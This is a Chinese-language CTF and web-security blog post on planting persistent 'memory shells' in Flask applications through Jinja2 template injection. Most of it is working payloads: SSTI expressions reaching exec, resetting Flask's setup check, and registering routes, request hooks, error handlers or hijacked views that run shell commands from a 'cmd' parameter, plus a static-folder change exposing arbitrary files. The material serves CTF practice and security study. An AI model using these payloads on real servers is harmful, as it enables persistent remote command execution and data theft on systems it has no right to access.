---
title: Flask内存马详解
toc: true
categories:
  - 技术
  - ctf
  - web
date: 2025-05-07 21:10:12
tags:
---

本篇以jinja2 ssti视角研究Flask高版本内存马

## 拿request对象

```py
__import__("flask").request.args.get("cmd") #直接从flask拿
ur1_for.__globals__['request']				#从flask的一些函数的__globals__里拿
request_ctx.request.args.get  				#request_ctx的属性
```

## app.view_functions相关

因为高版本给add_url_rule加了装饰器`@setupmethod`，这个装饰器会先调用`app._check_setup_finished`, 所以得将`app._got_first_request`改为False

```python
    def _check_setup_finished(self, f_name: str) -> None:
        if self._got_first_request:
            raise AssertionError(
                f"The setup method '{f_name}' can no longer be called"
                " on the application. It has already handled its first"
                " request, any changes will not be applied"
                " consistently.\n"
                "Make sure all imports, decorators, functions, etc."
                " needed to set up the application are done before"
                " running it."
            )
```

#### 装饰器

```python
{{lipsum.__globals__['__builtins__']['exec']('app._got_first_request=False
@app.get("/dd")#其他的应该都可以
def cmd():
    return __import__("os").popen(__import__("flask").request.args.get("cmd")).read()',{'app':url_for.__globals__['current_app']})}}
```

```python
{{lipsum.__globals__['__builtins__']['exec']('app._got_first_request=False
def cmd():
    return __import__("os").popen(__import__("flask").request.args.get("cmd")).read()
app.get("/dd")(cmd)',{'app':url_for.__globals__['current_app']})}}
```

#### add_url_rule

```python
{{lipsum.__globals__['__builtins__']['exec']('app._got_first_request=False
def cmd():
    return __import__("os").popen("whoami").read()'
app.add_url_rule("/ss","cmd",cmd)#使用lambda表达式也ok
,{'app':url_for.__globals__['current_app']})}}
```

#### add_url_rule最后还是调用`url_map.add(rule_obj)`然后`view_functions[endpoint] = view_func`

这里就不用改`app._got_first_request=False`啦

```py
url_for.__globals__['__builtins__']['exec'](
    "app.url_map.add(app.url_rule_class('/shell', methods=['GET'], endpoint='shell'));app.view_functions.update({'shell': lambda:__import__('os').popen('whoami').read()})",#或者app.view_functions["shell"]=lambda:__import__('os').popen('whoami').read()
    {'app':url_for.__globals__['current_app']}
)
```

endpoint装饰器会`view_functions[endpoint] = view_func`，但是有@setupmethod

```py
url_for.__globals__['__builtins__']['exec']("app._got_first_request=False
app.url_map.add(app.url_rule_class('/shell', methods=['GET'], endpoint='shell'))
@app.endpoint('shell')
def f():
	return __import__('os').popen('whoami').read()",
    {'app':url_for.__globals__['current_app']}
)
```

反正老多了比如`_method_route("PATCH", rule, options)`

#### 劫持路由函数

比如存在

@app.route("/")
		def index():

```py
url_for.__globals__['__builtins__']['exec'](
    "app.view_functions['index'] = lambda:__import__('os').popen('whoami').read()",#这里的index是你的路由装饰函数
    {'app':url_for.__globals__['current_app']}
)
```

## app.before_request_funcs相关

这函数也装饰了@setupmethod

```py
lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
@app.before_request
def f():
	return __import__('os').popen('whoami').read()",
{'app':url_for.__globals__['current_app']})
```

向before_request_funcs字典里加

```py
app.before_request_funcs.setdefault(None, []).append(lambda: __import__('os').popen('whoami').read())
```

## app.after_request_funcs相关

函数只能返回response对象

```py
{{lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
@app.after_request
def f(c):
	return __import__('flask').Response(__import__('os').popen('whoami').read())",#app.make_response可以直接生成Response，好多函数都能返回Response，但是不太好构造
{'app':url_for.__globals__['current_app']})}}
```

向after_request_funcs字典里加

```python
app.after_request_funcs.setdefault(None, []).append(lambda x:__import__('flask').Response(__import__('os').popen('whoami').read()))
```

## app.error_handler_spec相关

```
lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
@app.errorhandler(404)
def error_handler(d):
    return __import__('os').popen('whoami').read()",
{'app':url_for.__globals__['current_app']})
```

```py
lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
app.register_error_handler(404,lambda e:__import__('os').popen('whoami').read())",
{'app':url_for.__globals__['current_app']})
```

```py
{{url_for.__globals__['__builtins__']['exec']("global exc_class;global code;exc_class,code=app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda error:__import__('os').popen(request.args.get('cmd')).read()", {'request':url_for.__globals__['request'],'app':get_flashed_messages.__globals__['current_app']})}}
```

## 其他

app.teardown_request （无回显呀,感觉没啥意义）

```py
lipsum.__globals__['__builtins__']['exec']("app._got_first_request=False
@app.teardown_request
def f(x):
	return __import__('os').popen('whoami').read()",
{'app':url_for.__globals__['current_app']})
```

重写某些每次请求都会执行的函数，这样会比较危险，而且不容易有回显

## 回显相关

可以对Response类做更改

```py
Response.default_status=__import__('os').popen('whoami').read()
Response.default_mimetype=__import__('os').popen('whoami').read()
```

然后就是对Response对象的更改（有些只做了类型标准，没有初始化的属性就只能改响应对象啦）,但是每次请求都创建新响应对象，所以我觉得这个作用不大，本质上跟生成响应没啥区别

## 题外

改static_folder读任意文件

```py
app.static_url_path="/static";app.static_folder="/"   #然后static/app.py读源码
```

先写这么多，后面再更？
